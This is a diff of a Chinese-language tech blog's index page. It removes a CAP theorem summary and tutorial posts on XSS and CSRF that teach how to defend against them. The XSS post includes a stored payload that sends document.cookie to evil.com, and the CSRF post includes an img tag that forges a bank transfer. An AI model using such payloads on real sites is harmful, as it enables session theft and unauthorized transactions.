-<h2 id="為什麼不能三者兼得？"><a href="#為什麼不能三者兼得？" class="headerlink" title="為什麼不能三者兼得？"></a>為什麼不能三者兼得？</h2><p>當網路分區（P）發生時，必須在「一致性（C）」與「可用性（A）」之間做出選擇：</p>
-<ul>
-<li>如果選擇 <strong>一致性（C）</strong>，系統會犧牲可用性來保證資料一致性（可能暫時拒絕請求）。</li>
-<li>如果選擇 <strong>可用性（A）</strong>，系統會犧牲一致性來保持服務持續可用（可能讀到舊資料）。</li>
-</ul>
-<hr>
-<h2 id="CAP-組合與代表系統"><a href="#CAP-組合與代表系統" class="headerlink" title="CAP 組合與代表系統"></a>CAP 組合與代表系統</h2><table>
-<thead>
-<tr>
-<th>類型</th>
-<th>組合</th>
-<th>特性說明</th>
-<th>代表系統</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CP</td>
-<td>一致性 + 分區容忍性</td>
-<td>保證一致性，但可能暫時無法服務</td>
-<td>HBase、MongoDB（某些設定）</td>
-</tr>
-<tr>
-<td>AP</td>
-<td>可用性 + 分區容忍性</td>
-<td>系統持續可用，但資料可能不同步</td>
-<td>Cassandra、CouchDB</td>
-</tr>
-<tr>
-<td>CA</td>
-<td>一致性 + 可用性</td>
-<td>僅適用於單節點，無法容忍分區</td>
-<td>傳統單機資料庫（非分散式系統）</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>現代分散式系統幾乎都會選擇 P（分區容忍性），因為網路分區是不可避免的情況。</strong></p>
-</blockquote>
-<hr>
-<h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><ul>
-<li>分散式系統中 CAP 三者不可兼得，只能取其二。</li>
-<li>系統設計需根據業務需求，在一致性與可用性中取得平衡。</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/02/CAP-Theorem/" data-id="cmaf4t4wt0003iwq82m372qet" data-title="CAP Theorem" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/note/2025/03/26/XSS/" class="article-date">
-  <time class="dt-published" datetime="2025-03-26T16:13:01.000Z" itemprop="datePublished">2025-03-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/note/2025/03/26/XSS/">XSS</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>XSS（Cross-Site Scripting，跨站腳本攻擊）是一種 Web 安全漏洞，攻擊者透過在網站中注入惡意 JavaScript，使該腳本在其他使用者的瀏覽器中執行，從而竊取用戶資訊、控制瀏覽行為或進一步發動攻擊。</p>
-<hr>
-<h2 id="XSS-的攻擊類型"><a href="#XSS-的攻擊類型" class="headerlink" title="XSS 的攻擊類型"></a><strong>XSS 的攻擊類型</strong></h2><h3 id="1-反射型-XSS（Reflected-XSS）"><a href="#1-反射型-XSS（Reflected-XSS）" class="headerlink" title="1. 反射型 XSS（Reflected XSS）"></a><strong>1. 反射型 XSS（Reflected XSS）</strong></h3><p>攻擊者將惡意腳本放入 <strong>URL 參數或表單輸入</strong>，當受害者點擊惡意連結或提交表單時，惡意 JavaScript 會被伺服器回應並在瀏覽器中執行。</p>
-<h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a><strong>範例</strong></h4><p>假設某個網站接受 <code>query</code> 參數並直接顯示在頁面上：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>搜尋結果：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">decodeURIComponent</span>(location.<span class="property">search</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果攻擊者讓受害者點擊：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/search?query=&lt;script&gt;alert(&#x27;你被 XSS 攻擊了!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>那麼當受害者訪問該 URL，瀏覽器會執行 <code>alert(&#39;你被 XSS 攻擊了!&#39;)</code>，攻擊成功。</p>
-<hr>
-<h3 id="2-儲存型-XSS（Stored-XSS）"><a href="#2-儲存型-XSS（Stored-XSS）" class="headerlink" title="2. 儲存型 XSS（Stored XSS）"></a><strong>2. 儲存型 XSS（Stored XSS）</strong></h3><p>攻擊者將惡意腳本 <strong>儲存在伺服器上</strong>（如留言板、聊天室、論壇），其他使用者造訪該頁面時，惡意腳本會自動執行。</p>
-<h4 id="範例-1"><a href="#範例-1" class="headerlink" title="範例"></a><strong>範例</strong></h4><p>攻擊者在留言區發送：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://evil.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>當其他使用者查看這條留言時，瀏覽器會執行該 JavaScript，並將用戶的 Cookie 傳送給攻擊者，導致帳號被盜。</p>
-<hr>
-<h3 id="3-DOM-型-XSS（DOM-Based-XSS）"><a href="#3-DOM-型-XSS（DOM-Based-XSS）" class="headerlink" title="3. DOM 型 XSS（DOM-Based XSS）"></a><strong>3. DOM 型 XSS（DOM-Based XSS）</strong></h3><p>攻擊者利用 JavaScript 操作網頁 DOM，改變頁面內容並執行惡意腳本，通常不經過伺服器處理。</p>
-<h4 id="範例-2"><a href="#範例-2" class="headerlink" title="範例"></a><strong>範例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> input = location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>); <span class="comment">// 取得 URL 的 hash 值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>).<span class="property">innerHTML</span> = input;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>當用戶訪問：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/#&lt;script&gt;alert(&#x27;XSS!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>瀏覽器會直接執行 <code>alert(&#39;XSS!&#39;)</code>，攻擊成功。</p>
-<hr>
-<h2 id="XSS-的風險"><a href="#XSS-的風險" class="headerlink" title="XSS 的風險"></a><strong>XSS 的風險</strong></h2><ul>
-<li><strong>竊取使用者 Cookie，冒充身份（Session Hijacking）</strong></li>
-<li><strong>記錄按鍵、竊取密碼</strong></li>
-<li><strong>進行釣魚攻擊，顯示偽造的登入頁面</strong></li>
-<li><strong>發送惡意請求，影響網站功能</strong></li>
-<li><strong>植入後門，長期監控受害者</strong></li>
-</ul>
-<hr>
-<h2 id="如何防禦-XSS"><a href="#如何防禦-XSS" class="headerlink" title="如何防禦 XSS"></a><strong>如何防禦 XSS</strong></h2><h3 id="1-輸入驗證與過濾"><a href="#1-輸入驗證與過濾" class="headerlink" title="1. 輸入驗證與過濾"></a><strong>1. 輸入驗證與過濾</strong></h3><ul>
-<li>移除 <code>&lt;script&gt;</code>、<code>onerror</code>、<code>javascript:</code> 這類惡意標籤或屬性。</li>
-<li>限制允許的 HTML 標籤，例如使用 <strong>HTML Purifier</strong>（PHP）或 <strong>DOMPurify</strong>（JavaScript）。</li>
-</ul>
-<h3 id="2-輸出時進行-HTML-Escape"><a href="#2-輸出時進行-HTML-Escape" class="headerlink" title="2. 輸出時進行 HTML Escape"></a><strong>2. 輸出時進行 HTML Escape</strong></h3><ul>
-<li><strong>永遠不要直接插入用戶輸入</strong>，應對 HTML 內容進行編碼：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用者輸入：<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在後端（Python Flask）：<code>escape(user_input)</code></li>
-<li>在前端（JavaScript）：<code>.textContent = user_input</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="3-使用-CSP（Content-Security-Policy）"><a href="#3-使用-CSP（Content-Security-Policy）" class="headerlink" title="3. 使用 CSP（Content Security Policy）"></a><strong>3. 使用 CSP（Content Security Policy）</strong></h3><ul>
-<li>禁止內嵌腳本，防止 XSS 攻擊：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="4-使用-HttpOnly-Cookie"><a href="#4-使用-HttpOnly-Cookie" class="headerlink" title="4. 使用 HttpOnly Cookie"></a><strong>4. 使用 HttpOnly Cookie</strong></h3><ul>
-<li>防止 JavaScript 讀取 Cookie，降低 Session 被竊取的風險：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123; HttpOnly; Secure</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a><strong>結論</strong></h2><p>XSS 是一種透過注入惡意 JavaScript 來攻擊網站的漏洞，常見類型包括：</p>
-<ol>
-<li><strong>反射型 XSS</strong>（需要誘導受害者點擊惡意連結）。</li>
-<li><strong>儲存型 XSS</strong>（惡意腳本存儲在伺服器上，自動影響所有使用者）。</li>
-<li><strong>DOM 型 XSS</strong>（透過 JavaScript 操作 DOM 來執行攻擊）。</li>
-</ol>
-<p>有效的防禦措施包括：</p>
-<ul>
-<li><strong>輸入過濾</strong>（防止惡意代碼進入系統）。</li>
-<li><strong>輸出編碼</strong>（避免 JavaScript 被直接執行）。</li>
-<li><strong>CSP 安全策略</strong>（防止不受信任的腳本執行）。</li>
-<li><strong>HttpOnly Cookie</strong>（防止 JavaScript 竊取 Session）。</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/03/26/XSS/" data-id="cmaf4t4xz003biwq80tv70me4" data-title="XSS" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/note/2025/03/26/CSRF/" class="article-date">
-  <time class="dt-published" datetime="2025-03-26T16:02:29.000Z" itemprop="datePublished">2025-03-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/note/2025/03/26/CSRF/">CSRF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>CSRF（Cross-Site Request Forgery，跨站請求偽造） 是一種 Web 安全漏洞</p>
-<p>攻擊者可以利用受害者已經驗證的會話，在未經授權的情況下，透過受害者的瀏覽器發送惡意請求到受害者已登入的網站，執行未經授權的操作。</p>
-<h2 id="CSRF-攻擊流程"><a href="#CSRF-攻擊流程" class="headerlink" title="CSRF 攻擊流程"></a><strong>CSRF 攻擊流程</strong></h2><ol>
-<li><strong>受害者登入受信任的網站</strong>（如銀行、購物網站、社交平台），並且瀏覽器存有該網站的認證 Cookie。</li>
-<li><strong>攻擊者誘導受害者訪問惡意網站</strong>，例如：<ul>
-<li>透過電子郵件、社群媒體或廣告放置惡意連結。</li>
-<li>在受害者造訪的網站中嵌入惡意的 JavaScript 代碼（如 XSS 攻擊）。</li>
-</ul>
-</li>
-<li><strong>受害者的瀏覽器在未察覺的情況下向受信任的網站發送請求</strong>：<ul>
-<li>瀏覽器會自動附帶該網站的 Cookie，因為請求來自受害者的瀏覽器，網站會認為該請求是合法的。</li>
-<li>例如，攻擊者可以讓受害者透過 <code>GET</code> 或 <code>POST</code> 方法執行敏感操作，如轉帳、修改密碼、發送訊息等。</li>
-</ul>
-</li>
-<li><strong>受害者的請求成功執行</strong>，攻擊者達成目的。</li>
-</ol>
-<hr>
-<h2 id="CSRF-攻擊範例"><a href="#CSRF-攻擊範例" class="headerlink" title="CSRF 攻擊範例"></a><strong>CSRF 攻擊範例</strong></h2><p>假設受害者已登入某個銀行網站（<code>bank.com</code>），攻擊者可以在惡意網站中放置以下 HTML 代碼：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?amount=1000&amp;to=attacker_account&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>當受害者造訪這個網站時，瀏覽器會自動向 <code>bank.com</code> 發送請求，並附帶受害者的登入 Cookie，導致資金被轉移到攻擊者的帳戶。</p>
-<hr>
-<h2 id="如何防禦-CSRF"><a href="#如何防禦-CSRF" class="headerlink" title="如何防禦 CSRF"></a><strong>如何防禦 CSRF</strong></h2><h3 id="1-CSRF-Token"><a href="#1-CSRF-Token" class="headerlink" title="1. CSRF Token"></a><strong>1. CSRF Token</strong></h3><ul>
-<li>伺服器在每次表單提交或敏感操作時，生成一個獨特的隨機字串（Token）。</li>
-<li>這個 Token 必須隨著請求一起提交，伺服器會驗證 Token 是否正確。</li>
-<li>由於攻擊者無法輕易獲取這個 Token，因此無法偽造請求。</li>
-</ul>
-<p><strong>範例：</strong><br>後端返回 CSRF Token：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;random_csrf_token&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>轉帳<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>伺服器驗證 <code>csrf_token</code> 是否正確，若無效則拒絕請求。</p>
-<hr>
-<h3 id="2-SameSite-Cookie-設定"><a href="#2-SameSite-Cookie-設定" class="headerlink" title="2. SameSite Cookie 設定"></a><strong>2. SameSite Cookie 設定</strong></h3><ul>
-<li>設定 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code>，防止瀏覽器在跨站請求時自動附帶 Cookie。</li>
-<li><code>SameSite=Lax</code> 適用於大部分情境，<code>SameSite=Strict</code> 更為嚴格，但可能影響部分功能。</li>
-</ul>
-<p>範例：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123; Secure; HttpOnly; SameSite=Strict</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-驗證-Referer-或-Origin"><a href="#3-驗證-Referer-或-Origin" class="headerlink" title="3. 驗證 Referer 或 Origin"></a><strong>3. 驗證 <code>Referer</code> 或 <code>Origin</code></strong></h3><ul>
-<li>伺服器可以檢查 HTTP <code>Referer</code> 或 <code>Origin</code>，確認請求是否來自受信任的來源。</li>
-</ul>
-<hr>
-<h3 id="4-強制使用-POST-請求"><a href="#4-強制使用-POST-請求" class="headerlink" title="4. 強制使用 POST 請求"></a><strong>4. 強制使用 POST 請求</strong></h3><ul>
-<li>確保敏感操作（如轉帳、修改密碼）不使用 <code>GET</code> 方法，而是 <code>POST</code>，並搭配 CSRF Token。</li>
-</ul>
-<hr>
-<h3 id="5-用戶驗證"><a href="#5-用戶驗證" class="headerlink" title="5. 用戶驗證"></a><strong>5. 用戶驗證</strong></h3><ul>
-<li>在關鍵操作前，要求用戶重新輸入密碼或 2FA 驗證，例如：<ul>
-<li>銀行轉帳時，要求用戶輸入 OTP（一次性密碼）。</li>
-<li>修改郵箱或密碼時，要求重新登入。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a><strong>結論</strong></h2><p>CSRF 是一種利用使用者瀏覽器信任關係的攻擊方式，主要防禦措施包括：</p>
-<ul>
-<li>使用 CSRF Token 驗證請求來源。</li>
-<li>設置 <code>SameSite</code> 屬性的 Cookie 限制跨站請求。</li>
-<li>驗證 <code>Referer</code> 或 <code>Origin</code> 以過濾可疑請求。</li>
-<li>限制敏感操作只允許 <code>POST</code>，並要求額外身份驗證。</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/03/26/CSRF/" data-id="cmaf4t4wu0004iwq89gn20bax" data-title="CSRF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/04/first-class-object/" data-id="cmauf9m1v003pk2q9935j12rl" data-title="first class object" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1072,7 +1010,7 @@ flowchart TD
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/note/page/2/">2</a><a class="page-number" href="/note/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/note/page/11/">11</a><a class="extend next" rel="next" href="/note/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/note/page/2/">2</a><a class="page-number" href="/note/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/note/page/12/">12</a><a class="extend next" rel="next" href="/note/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1086,7 +1024,7 @@ flowchart TD
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Architecture/" rel="tag">Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Big-Query/" rel="tag">Big Query</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Chrome/" rel="tag">Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/GitHub/" rel="tag">GitHub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Go/" rel="tag">Go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Google-Cloud-Platform/" rel="tag">Google Cloud Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/IPython/" rel="tag">IPython</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Mac/" rel="tag">Mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/NumPy/" rel="tag">NumPy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Professional-Cloud-Architect/" rel="tag">Professional Cloud Architect</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/RDB/" rel="tag">RDB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Recommender-System/" rel="tag">Recommender System</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/SciPy/" rel="tag">SciPy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/System-Design/" rel="tag">System Design</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/avro/" rel="tag">avro</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/pandas/" rel="tag">pandas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/programming/" rel="tag">programming</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/sbt/" rel="tag">sbt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/seaborn/" rel="tag">seaborn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/sklearn/" rel="tag">sklearn</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Architecture/" rel="tag">Architecture</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Big-Query/" rel="tag">Big Query</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Chrome/" rel="tag">Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/GitHub/" rel="tag">GitHub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Go/" rel="tag">Go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Google-Cloud-Platform/" rel="tag">Google Cloud Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/IPython/" rel="tag">IPython</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Mac/" rel="tag">Mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/NumPy/" rel="tag">NumPy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Professional-Cloud-Architect/" rel="tag">Professional Cloud Architect</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/RDB/" rel="tag">RDB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/Recommender-System/" rel="tag">Recommender System</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/SciPy/" rel="tag">SciPy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/System-Design/" rel="tag">System Design</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/avro/" rel="tag">avro</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/pandas/" rel="tag">pandas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/programming/" rel="tag">programming</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/sbt/" rel="tag">sbt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/seaborn/" rel="tag">seaborn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/note/tags/sklearn/" rel="tag">sklearn</a></li></ul>
     </div>
   </div>
 
@@ -1096,7 +1034,7 @@ flowchart TD
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/note/tags/Architecture/" style="font-size: 10px;">Architecture</a> <a href="/note/tags/Big-Query/" style="font-size: 11.43px;">Big Query</a> <a href="/note/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/note/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/note/tags/GitHub/" style="font-size: 10px;">GitHub</a> <a href="/note/tags/Go/" style="font-size: 17.14px;">Go</a> <a href="/note/tags/Google-Cloud-Platform/" style="font-size: 12.86px;">Google Cloud Platform</a> <a href="/note/tags/IPython/" style="font-size: 10px;">IPython</a> <a href="/note/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/note/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/note/tags/NumPy/" style="font-size: 14.29px;">NumPy</a> <a href="/note/tags/Professional-Cloud-Architect/" style="font-size: 10px;">Professional Cloud Architect</a> <a href="/note/tags/Python/" style="font-size: 20px;">Python</a> <a href="/note/tags/RDB/" style="font-size: 10px;">RDB</a> <a href="/note/tags/Recommender-System/" style="font-size: 10px;">Recommender System</a> <a href="/note/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/note/tags/SciPy/" style="font-size: 10px;">SciPy</a> <a href="/note/tags/System-Design/" style="font-size: 10px;">System Design</a> <a href="/note/tags/avro/" style="font-size: 10px;">avro</a> <a href="/note/tags/git/" style="font-size: 15.71px;">git</a> <a href="/note/tags/pandas/" style="font-size: 18.57px;">pandas</a> <a href="/note/tags/programming/" style="font-size: 10px;">programming</a> <a href="/note/tags/sbt/" style="font-size: 10px;">sbt</a> <a href="/note/tags/seaborn/" style="font-size: 10px;">seaborn</a> <a href="/note/tags/sklearn/" style="font-size: 14.29px;">sklearn</a>
+      <a href="/note/tags/Architecture/" style="font-size: 10px;">Architecture</a> <a href="/note/tags/Big-Query/" style="font-size: 11.43px;">Big Query</a> <a href="/note/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/note/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/note/tags/GitHub/" style="font-size: 10px;">GitHub</a> <a href="/note/tags/Go/" style="font-size: 17.14px;">Go</a> <a href="/note/tags/Google-Cloud-Platform/" style="font-size: 12.86px;">Google Cloud Platform</a> <a href="/note/tags/IPython/" style="font-size: 10px;">IPython</a> <a href="/note/tags/Java/" style="font-size: 11.43px;">Java</a> <a href="/note/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/note/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/note/tags/NumPy/" style="font-size: 14.29px;">NumPy</a> <a href="/note/tags/Professional-Cloud-Architect/" style="font-size: 10px;">Professional Cloud Architect</a> <a href="/note/tags/Python/" style="font-size: 20px;">Python</a> <a href="/note/tags/RDB/" style="font-size: 10px;">RDB</a> <a href="/note/tags/Recommender-System/" style="font-size: 10px;">Recommender System</a> <a href="/note/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/note/tags/SciPy/" style="font-size: 10px;">SciPy</a> <a href="/note/tags/System-Design/" style="font-size: 10px;">System Design</a> <a href="/note/tags/avro/" style="font-size: 10px;">avro</a> <a href="/note/tags/git/" style="font-size: 15.71px;">git</a> <a href="/note/tags/pandas/" style="font-size: 18.57px;">pandas</a> <a href="/note/tags/programming/" style="font-size: 10px;">programming</a> <a href="/note/tags/sbt/" style="font-size: 10px;">sbt</a> <a href="/note/tags/seaborn/" style="font-size: 10px;">seaborn</a> <a href="/note/tags/sklearn/" style="font-size: 14.29px;">sklearn</a>
     </div>
   </div>
 
@@ -1118,23 +1056,23 @@ flowchart TD
       <ul>
         
           <li>
+            <a href="/note/2025/05/17/constructor-virtual-method-problem/">constructor virtual method problem</a>
+          </li>
+        
+          <li>
+            <a href="/note/2025/05/17/Java-virtual-method/">Java virtual method</a>
+          </li>
+        
+          <li>
+            <a href="/note/2025/05/17/go-table-driven-test/">go table-driven test</a>
+          </li>
+        
+          <li>
             <a href="/note/2025/05/08/avro-overview-and-examples/">avro overview and examples</a>
           </li>
         
           <li>
             <a href="/note/2025/05/05/gitmessage-guide/">gitmessage guide</a>
-          </li>
-        
-          <li>
-            <a href="/note/2025/05/02/go-mock/">go mock</a>
-          </li>
-        
-          <li>
-            <a href="/note/2025/04/26/Go-Module/">Go Module</a>
-          </li>
-        
-          <li>
-            <a href="/note/2025/04/26/go-install-vs-go-get/">go install vs go get</a>
           </li>
         
       </ul>
